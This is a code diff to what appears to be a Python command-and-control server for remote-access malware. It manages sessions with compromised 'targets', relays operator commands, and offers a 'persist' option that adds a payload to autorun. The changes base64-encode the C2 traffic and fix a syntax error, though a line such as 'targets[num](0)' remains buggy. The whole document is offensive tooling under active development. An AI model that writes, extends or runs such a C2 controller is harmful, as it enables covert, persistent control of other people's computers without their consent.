@@ -25,24 +25,27 @@ def banner():
 
 def comm_in(targ_id):
     print("[+] Awaiting response...")
-    response = targ_id.recv(1024).decode()
+    response = targ_id.recv(4096).decode()
+    response = base64.b64decode(response)
+    response = response.decode().strip()
     return response
 
 
 def comm_out(targ_id, message):
     message = str(message)
-    targ_id.send(message.encode())
+    message = base64.b64encode(bytes(message, encoding='utf8'))
+    targ_id.send(message)
 
 
 def kill_sig(targ_id, message):
     message = str(message)
-    targ_id.send(message.encode())
+    message = base64.b64encode(bytes(message, encoding='utf8'))
+    targ_id.send(message)
 
 
 def target_comm(targ_id, targets, num):
     while True:
         message = input(f"{targets[num][3]}/{targets[num][1]}#> ")
-        comm_out(targ_id, message)
         if len(message) == 0:
             continue
         if message == "help":
@@ -50,14 +53,14 @@ def target_comm(targ_id, targets, num):
         else:
             comm_out(targ_id, message)
             if message == "exit":
-                targ_id.send(message.encode())
+                targ_id.send(message)
                 targ_id.close()
                 targets[num][7] = "Dead"
                 break
             if message == "background":
                 break
             if message == "help":
-                break
+                pass
             if message == "persist":
                 payload_name = input(
                     "[+] Enter the name of the payload to add to autorun: "
@@ -100,8 +103,11 @@ def comm_handler():
         try:
             remote_target, remote_ip = sock.accept()
             username = remote_target.recv(1024).decode()
+            username = base64.b64decode(username).decode()
             admin = remote_target.recv(1024).decode()
-            op_sys = remote_target.recv(1024).decode()
+            admin = base64.b64decode(admin).decode()
+            op_sys = remote_target.recv(4096).decode()
+            op_sys = base64.b64decode(op_sys).decode()
             if admin == "1":
                 admin_val = "Yes"
             elif username == "root":
@@ -362,7 +368,7 @@ if __name__ == "__main__":
                             try:
                                 num = int(command.split(" ")[1])
                                 targ_id = (targets[num](0))
-                                if (targets[num])[7] == "Active"
+                                if (targets[num])[7] == "Active":
                                     kill_sig(targ_id, "exit")
                                     targets[num][7] = "Dead"
                                     print(f"[+] Session {num} terminated.")
